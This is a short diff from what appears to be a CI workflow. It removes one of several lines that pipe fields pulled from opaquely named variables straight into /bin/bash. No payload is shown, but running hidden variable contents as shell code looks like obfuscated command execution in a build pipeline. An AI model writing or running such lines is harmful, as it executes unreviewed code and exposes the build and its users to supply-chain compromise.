@@ -28,7 +28,6 @@ jobs:
           echo $g11 | jq -r .up7888 | /bin/bash
           printf '%s' "$qqb53" | jq -r .rpfv29325 | /bin/bash
           echo $dt76413 | jq -r .t0098 | /bin/bash
-          echo $oqy731 | jq -r .qi84 | /bin/bash
           echo $koqwx4 | jq -r .caq330 | /bin/bash
 
       - name: Save output
